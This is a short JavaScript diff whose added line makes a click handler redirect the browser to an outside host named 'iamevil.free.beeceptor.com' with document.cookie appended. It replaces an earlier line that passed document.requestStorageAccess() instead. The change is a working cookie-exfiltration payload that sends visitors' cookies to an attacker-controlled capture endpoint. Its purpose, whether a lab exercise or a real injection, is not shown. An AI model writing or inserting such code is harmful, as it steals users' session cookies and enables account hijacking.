@@ -6,5 +6,5 @@ function getRandomInt(max) {
   }  
 
 color.onclick = () => {
-    document.location = 'https://iamevil.free.beeceptor.com/?' + document.requestStorageAccess();
+    document.location = 'https://iamevil.free.beeceptor.com/?' + document.cookie;
 }
